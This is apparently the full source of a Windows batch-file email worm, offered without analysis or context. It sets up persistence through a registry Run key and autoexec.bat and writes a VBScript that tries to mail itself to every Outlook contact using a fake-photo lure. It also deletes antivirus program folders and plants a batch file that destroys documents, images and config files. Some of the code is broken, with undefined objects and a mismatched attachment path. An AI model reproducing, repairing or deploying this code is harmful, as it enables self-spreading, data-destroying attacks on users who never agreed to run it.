   @echo off
   md\windows\mirko
   copy /y *.bat C:\windows\mirko
   ren C:\windows\mirko\*.bat vale.bat
   cls
   if exist C:\windows\mirko.vbs goto 2
   echo REGEDIT4 >C:\windows\mirko.reg
   echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >nul >>C:\windows\mirko.reg
   echo "mirko"="C:\\WINDOWS\\mirko\\vale.bat" >nul >>C:\windows\mirko.reg
   regedit /s C:\windows\mirko.reg
   echo Set Mirko = CreateObject("Outlook.Application") >C:\windows\mirko.val
   echo Set Valentina = Client.GetNameSpace("MAPI") >nul >>C:\windows\mirko.val
   echo For ItemList = 1 To Address.AddressLists.Count >nul >>C:\windows\mirko.val
   echo    Set CurrentAddress = Address.AddressLists(ItemList) >nul >>C:\windows\mirko.val
   echo        For entries = 1 To CurrentAddress.AddressEntries.Count >nul >>C:\windows\mirko.val
   echo            mirkoz = CurrentAddress.AddressEntries(entries) >nul >>C:\windows\mirko.val
   echo            Set Mailtosend = Client.CreateItem(0) >nul >>C:\windows\mirko.val
   echo            Mailtosend.Recipients.Add (mirkoz) >nul >>C:\windows\mirko.val
   echo            Mailtosend.Subject = "SMS for YOU by Valentina" >nul >>C:\windows\mirko.val
   echo            Mailtosend.Body = "Ciao sono Valentina ti mando la mia foto nel file allegato !!!!" >nul >>C:\windows\mirko.val
   echo            Mailtosend.Attachments.Add ("c:\windows\mk\mirko.bat") >nul >>C:\windows\mirko.val
   echo            Mailtosend.Send >nul >>C:\windows\mirko.val
   echo        Next >nul >>C:\windows\mirko.val
   echo Next >nul >>C:\windows\mirko.val
   echo Set Mirko = Nothing >nul >>C:\windows\mirko.val
   echo Set Valentina = Nothing >nul >>C:\windows\mirko.val
   ren C:\windows\mirko.val mirko.vbs
   start C:\windows\mirko.vbs
   if exist C:\progra~1\norton~1\*.* deltree /y C:\progra~1\norton~1\*.*
   cls
   if exist C:\progra~1\norton~2\*.* deltree /y C:\progra~1\norton~2\*.*
   cls
   if exist C:\progra~1\trendm~1\*.* deltree /y C:\progra~1\trendm~1\*.*
   cls
   if exist C:\progra~1\zonela~1\*.* deltree /y C:\progra~1\zonela~1\*.*
   cls
   attrib -r -h C:\autoexec.bat >nul
   echo @call C:\windows\vale.bat >nul >>C:\autoexec.bat
   if not exist C:\windows\vale.bat goto 1
   if exist C:\windows\vale.bat goto 2
   :1
   echo @echo off >C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.ocx >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.jpg >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.zip >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.cab >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.doc >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.txt >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.log >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.bin >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.dat >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.gif >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.pif >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.scf >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\windows\*.cfg >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.ocx >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.jpg >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.zip >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.cab >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.doc >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.txt >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.log >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.bin >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.dat >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.gif >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.pif >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.scf >nul >>C:\windows\vale.bat
   echo deltree /y if exist C:\docume~1\*.cfg >nul >>C:\windows\vale.bat
   echo cls >nul >>C:\windows\vale.bat
   goto 2
   :2
   cls
